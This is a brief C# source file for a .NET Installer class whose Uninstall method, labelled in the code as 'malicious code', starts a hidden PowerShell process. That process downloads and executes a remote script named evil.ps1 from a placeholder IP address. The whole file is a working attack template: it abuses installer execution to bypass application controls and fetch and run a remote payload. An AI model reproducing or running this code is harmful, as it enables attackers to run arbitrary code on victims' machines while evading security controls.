using System;
using System.Configuration.Install;
using System.Collections;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Sample : Installer
{
    public override void Uninstall(IDictionary savedState)
    {
        base.Uninstall(savedState);
        Console.WriteLine("Executing malicious code...");
        System.Diagnostics.Process.Start("powershell.exe", "-nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP地址/payload/white/evil.ps1')");
    }
}
